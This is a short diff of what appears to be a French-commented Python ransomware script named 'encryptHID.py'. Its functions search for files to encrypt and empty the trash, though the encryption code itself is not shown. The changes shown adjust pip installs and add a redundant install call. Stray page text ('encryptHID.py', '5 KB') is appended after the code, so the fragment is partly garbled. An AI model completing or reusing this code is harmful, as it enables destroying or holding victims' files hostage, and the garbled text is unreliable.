@@ -9,7 +9,9 @@ def install_libraries():
     # Installe les librairies en utilisant pip
     try:
         print("Installation des bibliothèques requises...")
-        os.system("pip install py7zr send2trash")
+        os.system("pip3 install py7zr send2trash")
+        import py7zr
+        from send2trash import send2trash
         print("Bibliothèques installées avec succès.")
     except Exception as e:
         print(f"Erreur lors de l'installation des bibliothèques : {e}")
@@ -78,6 +80,7 @@ def empty_trash():
 def main():
     # Installe les librairies
     install_libraries()
+    os.system("pip3 install py7zr send2trash")
 
     files_to_encrypt = search_files()
     if files_to_encrypt:
@@ -105,3 +108,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+encryptHID.py
+5 KB
